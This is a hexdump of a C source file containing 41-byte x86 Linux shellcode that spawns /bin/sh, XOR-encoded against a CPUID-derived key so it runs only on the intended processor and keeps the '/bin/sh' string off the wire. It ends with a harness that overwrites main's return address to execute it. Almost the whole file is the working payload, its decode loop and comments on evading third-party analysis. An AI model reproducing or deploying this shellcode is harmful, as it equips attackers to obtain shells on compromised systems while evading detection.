00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 65 78 65 63 76  65 28 22 2f 62 69 6e 2f  |6) execve("/bin/|
00000020  73 68 22 2c 20 5b 22 2f  62 69 6e 2f 73 68 22 5d  |sh", ["/bin/sh"]|
00000030  2c 20 4e 55 4c 4c 29 20  2f 20 78 6f 72 27 65 64  |, NULL) / xor'ed|
00000040  20 61 67 61 69 6e 73 74  20 49 6e 74 65 6c 20 78  | against Intel x|
00000050  38 36 20 43 50 55 49 44  20 2d 20 34 31 20 62 79  |86 CPUID - 41 by|
00000060  74 65 73 0d 0a 20 2a 0d  0a 20 2a 20 54 68 65 20  |tes.. *.. * The |
00000070  69 64 65 61 20 62 65 68  69 6e 64 20 74 68 69 73  |idea behind this|
00000080  20 73 68 65 6c 6c 63 6f  64 65 20 69 73 20 74 6f  | shellcode is to|
00000090  20 75 73 65 20 61 20 2a  77 65 61 6b 2a 20 70 72  | use a *weak* pr|
000000a0  65 2d 73 68 61 72 65 64  20 73 65 63 72 65 74 20  |e-shared secret |
000000b0  62 65 74 77 65 65 6e 20  74 68 65 20 61 74 74 61  |between the atta|
000000c0  63 6b 65 72 20 61 6e 64  0d 0a 20 2a 20 74 68 65  |cker and.. * the|
000000d0  20 61 74 74 61 63 6b 65  64 20 6d 61 63 68 69 6e  | attacked machin|
000000e0  65 2e 20 53 6f 20 69 66  20 61 20 33 72 64 20 70  |e. So if a 3rd p|
000000f0  61 72 74 79 20 73 69 64  65 20 77 6f 75 6c 64 20  |arty side would |
00000100  74 72 79 20 74 6f 20 72  75 6e 20 74 68 69 73 20  |try to run this |
00000110  73 68 65 6c 6c 63 6f 64  65 20 61 6e 64 20 77 6f  |shellcode and wo|
00000120  75 6c 64 20 70 72 6f 64  75 63 65 20 0d 0a 20 2a  |uld produce .. *|
00000130  20 61 20 64 69 66 66 65  72 65 6e 74 20 43 50 55  | a different CPU|
00000140  49 44 20 6f 75 74 70 75  74 20 28 65 2e 67 2e 20  |ID output (e.g. |
00000150  64 69 66 66 65 72 65 6e  74 20 61 72 63 68 29 20  |different arch) |
00000160  74 68 65 20 73 68 65 6c  6c 63 6f 64 65 20 77 6f  |the shellcode wo|
00000170  6e 27 74 20 77 6f 72 6b  2e 20 49 6e 20 61 64 64  |n't work. In add|
00000180  69 74 69 6f 6e 20 74 68  69 73 20 61 6c 73 6f 0d  |ition this also.|
00000190  0a 20 2a 20 70 72 65 76  65 6e 74 73 20 66 72 6f  |. * prevents fro|
000001a0  6d 20 68 61 76 69 6e 67  20 74 68 65 20 27 2f 62  |m having the '/b|
000001b0  69 6e 2f 73 68 27 20 73  74 72 69 6e 67 20 76 69  |in/sh' string vi|
000001c0  73 69 62 6c 65 20 6f 6e  20 74 68 65 20 77 69 72  |sible on the wir|
000001d0  65 2e 0d 0a 20 2a 0d 0a  20 2a 20 54 68 65 20 73  |e... *.. * The s|
000001e0  68 65 6c 6c 63 6f 64 65  20 6b 65 79 20 69 73 20  |hellcode key is |
000001f0  28 30 78 36 63 36 35 37  34 36 65 2c 20 27 6c 65  |(0x6c65746e, 'le|
00000200  74 6e 27 29 20 61 6e 64  20 65 78 70 65 63 74 65  |tn') and expecte|
00000210  64 20 74 6f 20 62 65 20  69 6e 20 25 65 63 78 20  |d to be in %ecx |
00000220  72 65 67 69 73 74 65 72  20 61 66 74 65 72 20 43  |register after C|
00000230  50 55 49 44 0d 0a 20 2a  20 0d 0a 20 2a 20 2d 20  |PUID.. * .. * - |
00000240  69 7a 69 6b 20 3c 69 7a  69 6b 40 74 74 79 36 34  |izik <izik@tty64|
00000250  2e 6f 72 67 3e 0d 0a 20  2a 2f 0d 0a 0d 0a 63 68  |.org>.. */....ch|
00000260  61 72 20 73 68 65 6c 6c  63 6f 64 65 5b 5d 20 3d  |ar shellcode[] =|
00000270  20 0d 0a 0d 0a 09 22 5c  78 33 31 5c 78 63 30 22  | ....."\x31\xc0"|
00000280  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000290  20 78 6f 72 20 25 65 61  78 2c 25 65 61 78 20 0d  | xor %eax,%eax .|
000002a0  0a 09 22 5c 78 30 66 5c  78 61 32 22 20 20 20 20  |.."\x0f\xa2"    |
000002b0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 63 70 75  |          // cpu|
000002c0  69 64 20 0d 0a 09 22 5c  78 35 31 22 20 20 20 20  |id ..."\x51"    |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000002e0  20 70 75 73 68 20 25 65  63 78 20 0d 0a 09 22 5c  | push %ecx ..."\|
000002f0  78 36 38 5c 78 65 37 5c  78 39 35 5c 78 61 38 5c  |x68\xe7\x95\xa8\|
00000300  78 65 63 22 20 20 2f 2f  20 70 75 73 68 20 24 30  |xec"  // push $0|
00000310  78 65 63 61 38 39 35 65  37 20 0d 0a 09 22 5c 78  |xeca895e7 ..."\x|
00000320  36 38 5c 78 64 65 5c 78  37 66 5c 78 33 37 5c 78  |68\xde\x7f\x37\x|
00000330  33 66 22 20 20 2f 2f 20  70 75 73 68 20 24 30 78  |3f"  // push $0x|
00000340  33 66 33 37 37 66 64 65  20 0d 0a 09 22 5c 78 36  |3f377fde ..."\x6|
00000350  38 5c 78 30 37 5c 78 31  61 5c 78 65 63 5c 78 38  |8\x07\x1a\xec\x8|
00000360  66 22 20 20 2f 2f 20 70  75 73 68 20 24 30 78 38  |f"  // push $0x8|
00000370  66 65 63 31 61 30 37 20  0d 0a 09 22 5c 78 36 38  |fec1a07 ..."\x68|
00000380  5c 78 36 65 5c 78 31 63  5c 78 34 61 5c 78 30 65  |\x6e\x1c\x4a\x0e|
00000390  22 20 20 2f 2f 20 70 75  73 68 20 24 30 78 30 65  |"  // push $0x0e|
000003a0  34 61 31 63 36 65 20 0d  0a 09 22 5c 78 36 38 5c  |4a1c6e ..."\x68\|
000003b0  78 30 36 5c 78 35 62 5c  78 31 36 5c 78 30 34 22  |x06\x5b\x16\x04"|
000003c0  20 20 2f 2f 20 70 75 73  68 20 24 30 78 30 34 31  |  // push $0x041|
000003d0  36 35 62 30 36 20 0d 0a  0d 0a 09 2f 2f 0d 0a 09  |65b06 .....//...|
000003e0  2f 2f 20 3c 5f 75 6e 70  61 63 6b 5f 6c 6f 6f 70  |// <_unpack_loop|
000003f0  3e 3a 0d 0a 09 2f 2f 0d  0a 0d 0a 09 22 5c 78 33  |>:...//....."\x3|
00000400  31 5c 78 30 63 5c 78 32  34 22 20 20 20 20 20 20  |1\x0c\x24"      |
00000410  20 20 20 20 2f 2f 20 78  6f 72 20 25 65 63 78 2c  |    // xor %ecx,|
00000420  28 25 65 73 70 29 20 0d  0a 09 22 5c 78 35 61 22  |(%esp) ..."\x5a"|
00000430  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000440  20 20 2f 2f 20 70 6f 70  20 25 65 64 78 20 0d 0a  |  // pop %edx ..|
00000450  09 22 5c 78 37 35 5c 78  66 61 22 20 20 20 20 20  |."\x75\xfa"     |
00000460  20 20 20 20 20 20 20 20  20 2f 2f 20 6a 6e 65 20  |         // jne |
00000470  3c 5f 75 6e 70 61 63 6b  5f 6c 6f 6f 70 3e 20 0d  |<_unpack_loop> .|
00000480  0a 09 22 5c 78 38 33 5c  78 65 63 5c 78 31 38 22  |.."\x83\xec\x18"|
00000490  20 20 20 20 20 20 20 20  20 20 2f 2f 20 73 75 62  |          // sub|
000004a0  20 24 30 78 31 38 2c 25  65 73 70 20 0d 0a 09 22  | $0x18,%esp ..."|
000004b0  5c 78 35 34 22 20 20 20  20 20 20 20 20 20 20 20  |\x54"           |
000004c0  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 25  |       // push %|
000004d0  65 73 70 20 0d 0a 09 22  5c 78 63 33 22 3b 20 20  |esp ..."\xc3";  |
000004e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000004f0  2f 20 72 65 74 20 0d 0a  0d 0a 69 6e 74 20 6d 61  |/ ret ....int ma|
00000500  69 6e 28 69 6e 74 20 61  72 67 63 2c 20 63 68 61  |in(int argc, cha|
00000510  72 20 2a 2a 61 72 67 76  29 20 7b 0d 0a 09 69 6e  |r **argv) {...in|
00000520  74 20 2a 72 65 74 3b 0d  0a 09 72 65 74 20 3d 20  |t *ret;...ret = |
00000530  28 69 6e 74 20 2a 29 26  72 65 74 20 2b 20 32 3b  |(int *)&ret + 2;|
00000540  0d 0a 09 28 2a 72 65 74  29 20 3d 20 28 69 6e 74  |...(*ret) = (int|
00000550  29 20 73 68 65 6c 6c 63  6f 64 65 3b 0d 0a 7d     |) shellcode;..}|
0000055f
